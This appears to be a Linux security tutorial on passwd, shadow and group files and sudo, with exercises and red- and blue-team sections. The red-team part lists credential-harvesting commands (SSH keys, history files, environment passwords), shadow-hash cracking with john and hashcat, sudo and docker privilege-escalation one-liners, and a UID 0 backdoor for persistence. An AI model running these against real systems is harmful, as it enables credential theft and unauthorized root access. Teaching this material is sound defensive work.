1. Theory Section
/etc/passwd · /etc/shadow · groups · sudo

Anatomy of /etc/passwd

Every user account on the system has one line in /etc/passwd. It is world-readable — anyone can see it. It has 7 colon-separated fields:

root:x:0:0:root:/root:/bin/bash
1
username
Login name. root is always UID 0.
2
password
x means the real hash is in /etc/shadow. If this field ever contains an actual hash, that's a security problem.
3
UID
User ID number. 0 = root. 1–999 = system/service accounts. 1000+ = regular human users.
4
GID
Primary group ID. Maps to a line in /etc/group.
5
GECOS / comment
Full name or description. Often empty. Purely informational.
6
home directory
Where the user lands on login. /root for root, /home/username for regular users.
7
login shell
/bin/bash gives a full shell. /usr/sbin/nologin or /bin/false blocks interactive login — used for service accounts.

Anatomy of /etc/shadow

/etc/shadow is readable only by root (and the shadow group). It stores the actual password hashes and expiry policy. 9 colon-separated fields:

root:$6$salt$hash...:19000:0:99999:7:::
1
username
Matches /etc/passwd username.
2
password hash
The actual hash. Format: $id$salt$hash. A ! or * means account is locked. An empty field means no password required — dangerous.
3
last changed
Days since Jan 1 1970 the password was last changed.
4
min age
Minimum days before password can be changed again. 0 = no minimum.
5
max age
Days until password expires. 99999 = never expires.
6
warn period
Days before expiry to warn the user.
7-9
inactive / expire / reserved
Account inactivity lock, absolute expiry date, reserved field. Often empty.

Password hash formats in /etc/shadow

$1$ — MD5 (legacy, broken)
Never acceptable on modern systems. Crackers break these in seconds.
$5$ — SHA-256
Acceptable but aging. Still used on some systems.
$6$ — SHA-512 (most common)
Current default on most Linux distros. Much slower to crack than MD5.
$y$ or $2b$ — yescrypt / bcrypt
Modern systems. Intentionally slow, memory-hard. Hardest to crack.

Anatomy of /etc/group

sudo:x:27:alice,bob
1
group name
Human-readable name. sudo, docker, shadow, www-data are security-significant groups.
2
password
Almost always x. Group passwords are rarely used.
3
GID
Group ID number.
4
members
Comma-separated list of users in this group. Being in sudo or docker is effectively root-level access.

How sudo works

sudo allows a permitted user to run a command as another user (usually root). The rules are defined in /etc/sudoers, which should only ever be edited via visudo (it validates syntax before saving — a broken sudoers file locks everyone out).

alice ALL=(ALL:ALL) ALL # alice can run any command as any user bob ALL=(ALL) NOPASSWD: /usr/bin/apt # bob can run apt as root, no password %sudo ALL=(ALL:ALL) ALL # % means group — all sudo group members
sudo -l
List what the current user can run with sudo — first thing attackers check
su - username
Switch user completely, loading their full environment
whoami vs id
whoami = just username. id = UID, GID, and all supplementary groups
NOPASSWD
Lets a user sudo without entering a password — high-risk misconfiguration

2. Practical Section
Read, add, manage users · audit sudo

Exercise 1 — read and understand /etc/passwd

cat /etc/passwd # all accounts cat /etc/passwd | cut -d: -f1 # just usernames cat /etc/passwd | cut -d: -f1,3,7 # username, UID, shell cat /etc/passwd | awk -F: '$3 >= 1000' # only human users (UID >= 1000) cat /etc/passwd | awk -F: '$3 == 0' # only UID 0 accounts (should be root only) grep "/bin/bash" /etc/passwd # accounts with real login shells grep "nologin\|false" /etc/passwd # service accounts blocked from login

Exercise 2 — inspect /etc/shadow (run as root or sudo)

sudo cat /etc/shadow # view shadow file sudo cat /etc/shadow | cut -d: -f1,2 # username + hash only sudo cat /etc/shadow | awk -F: '$2 == "!" || $2 == "*"' # locked accounts sudo cat /etc/shadow | awk -F: '$2 == ""' # accounts with NO password (danger) sudo grep "^\$1\$" /etc/shadow # find old MD5 hashes (broken)

Exercise 3 — explore groups

cat /etc/group # all groups groups # your current groups id # your UID, GID and all supplementary groups id root # root's groups cat /etc/group | grep "sudo\|wheel" # who has admin group membership cat /etc/group | grep "docker" # docker group = effective root

Exercise 4 — user management commands

sudo useradd -m -s /bin/bash testuser # create user with home + bash shell sudo passwd testuser # set password for testuser sudo usermod -aG sudo testuser # add to sudo group (-a = append) sudo usermod -L testuser # lock account sudo usermod -U testuser # unlock account id testuser # verify groups sudo userdel -r testuser # delete user + home directory

Exercise 5 — audit sudo configuration

sudo -l # what can I run as sudo? sudo -l -U testuser # what can testuser run? sudo cat /etc/sudoers # full sudoers file (read-only view) sudo ls /etc/sudoers.d/ # per-package sudo rules sudo grep -v "^#\|^$" /etc/sudoers # sudoers without comments/blanks

Exercise 6 — who is logged in and recent logins

who # currently logged-in users w # logged in + what they're doing last # login history (from /var/log/wtmp) lastb # failed login attempts (from /var/log/btmp) last | head -20 # most recent 20 logins lastlog # last login for every user on the system

Exercise 7 — password policy inspection

sudo chage -l root # password aging info for root sudo chage -l $USER # your own password aging sudo passwd -S testuser # quick password status (locked/active/etc) cat /etc/login.defs | grep -v "^#\|^$" # system-wide password policy defaults
3. Real-World Scenario
sudo misconfiguration leads to full root

A junior sysadmin sets up a Linux server for a development team. They want deploy to be able to restart the web service without a password. One misconfigured sudoers line later, the entire server belongs to anyone who can log in as that account.

The misconfigured sudoers line

The admin wrote: deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl. The intent was to let deploy restart one service. But systemctl with no restriction means the user can run ANY systemctl command — including spawning a privileged shell.

Attacker gets low-privilege access

An attacker compromises the deploy account via a leaked SSH key found in a public GitHub repo. They run sudo -l — the first command any pentester runs. They immediately see the unrestricted systemctl sudo rule.

Privilege escalation via GTFOBins

GTFOBins lists systemctl as exploitable via sudo. The attacker runs:
sudo systemctl, which opens the systemctl pager (less), and from within less they type !/bin/bash — spawning a root shell. Total time: 90 seconds.

Persistence via /etc/passwd

With root, they add a backdoor account directly to /etc/passwd with UID 0 and a known password hash, giving themselves permanent root-level access even if the deploy key is rotated.

What should have happened

The sudoers line should have been: deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx — restricting it to one specific command. Always use the most specific command path possible in sudoers. Audit sudo -l for every account regularly.

4. Red Team Perspective
Users, hashes, and sudo-based privesc

Post-exploitation user recon — the full checklist

id && whoami # current identity sudo -l # sudo privileges — check GTFOBins for every result cat /etc/passwd | awk -F: '$3 == 0' # any other UID 0 accounts besides root? cat /etc/passwd | grep "/bin/bash" # accounts with real shells cat /etc/group | grep -E "sudo|wheel|adm|docker|lxd|disk" # privileged groups ls -la /home # other user home directories to explore cat /home/*/.bash_history 2>/dev/null # credential leaks in history files cat /home/*/.ssh/id_rsa 2>/dev/null # SSH private keys find / -name ".netrc" 2>/dev/null # legacy credential file env | grep -i pass # passwords in environment variables

Cracking /etc/shadow hashes (offline attack)

If an attacker can read /etc/shadow (requires root or shadow group), they extract hashes and crack them offline using Hashcat or John the Ripper. The hash never needs to be decrypted — it's a one-way function. The attacker just generates candidate passwords and compares hashes.

unshadow /etc/passwd /etc/shadow > combined.txt # merge for john john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt # dictionary attack hashcat -m 1800 shadow.txt rockyou.txt # hashcat SHA-512 ($6$) mode hashcat -m 500 shadow.txt rockyou.txt # hashcat MD5 ($1$) mode — fast crack

sudo-based privilege escalation quick reference

  • sudo -l shows vim → sudo vim -c ':!/bin/bash' → root shell
  • sudo -l shows python3 → sudo python3 -c "import os; os.system('/bin/bash')"
  • sudo -l shows find → sudo find . -exec /bin/bash \; -quit
  • sudo -l shows less/man → open file, type !/bin/bash
  • sudo -l shows (ALL, !root) → try sudo -u#-1 /bin/bash (CVE-2019-14287)

Dangerous group membership

  • docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh = instant root
  • disk group → direct read/write access to block devices, bypass filesystem permissions
  • lxd group → container escape to root via LXD privilege escalation
  • shadow group → read /etc/shadow directly and crack hashes offline
  • adm group → read all system logs including auth.log and syslog
5. Blue Team Perspective
Harden accounts · Audit sudo · Monitor logins

Account hardening checklist

sudo passwd -l root # lock root account (use sudo instead) sudo grep "^+:" /etc/passwd # find legacy NIS entries (security risk) sudo awk -F: '($3 == 0 && $1 != "root") {print $1}' /etc/passwd # non-root UID 0 accounts sudo awk -F: '($2 == "" ) {print $1}' /etc/shadow # accounts with no password sudo awk -F: 'length($2) < 13 && $2 != "!" && $2 != "*" && $2 != "x" {print $1}' /etc/shadow # weak hashes

Enforce strong password policy

sudo apt install libpam-pwquality # install password quality module sudo nano /etc/security/pwquality.conf minlen = 12 # minimum 12 characters dcredit = -1 # at least 1 digit ucredit = -1 # at least 1 uppercase lcredit = -1 # at least 1 lowercase ocredit = -1 # at least 1 special char

Audit and tighten sudo

sudo grep -v "^#\|^$" /etc/sudoers # review all active rules sudo grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ # find passwordless sudo sudo grep -r "(ALL)" /etc/sudoers /etc/sudoers.d/ # find unrestricted sudo for user in $(cut -d: -f1 /etc/passwd); do sudo -l -U $user 2>/dev/null | grep -q "may run" && echo "$user has sudo"; done

Monitor authentication events

tail -f /var/log/auth.log # live auth events grep "sudo" /var/log/auth.log | tail -20 # recent sudo usage grep "FAILED" /var/log/auth.log | tail -20 # failed sudo attempts grep "new user\|new group" /var/log/auth.log # account creation events last -n 20 # 20 most recent logins lastb -n 20 # 20 most recent failed logins

Lock down service accounts

Service accounts (web servers, databases, etc.) should never have login shells or valid passwords. Ensure they use /usr/sbin/nologin or /bin/false as their shell and are locked in shadow.

sudo usermod -s /usr/sbin/nologin www-data # set nologin shell sudo usermod -L www-data # lock the account sudo passwd -S www-data # verify: should show 'L' (locked)

10. Pro Tips & Mindset
What professionals know that beginners miss

sudo -l is the single most important command to run after gaining any foothold. It takes one second and tells you everything about what privilege escalation paths are available. Make it a reflex — run it before anything else.

When auditing a system, always check for users with UID 0 that are not root: awk -F: '($3==0){print}' /etc/passwd. A second UID 0 account is a backdoor — on a legitimate system, this should never exist.

The docker group is effectively root. Any user in the docker group can mount the host filesystem into a container and escape to root in one command. Treat docker group membership as seriously as sudo access.

Common mistake: editing /etc/sudoers directly with a text editor. Always use visudo. A syntax error in sudoers locks everyone out of sudo and potentially out of the system entirely. visudo validates before saving.

Common mistake: thinking password hashing = encryption. Hashes are one-way — you cannot decrypt them. Cracking means guessing the input and comparing the resulting hash. Strong hashing algorithms like $y$ (yescrypt) are deliberately slow to make this expensive.

Common mistake: leaving service accounts with login shells. www-data, mysql, nginx — none of these should ever have /bin/bash as their shell. If an attacker compromises those services, a login shell gives them a usable terminal.

Pro mindset: after any system change involving users or sudo, immediately verify with last, who, and grep sudo /var/log/auth.log. Defenders close the loop — they confirm what happened, not just what they intended to happen.
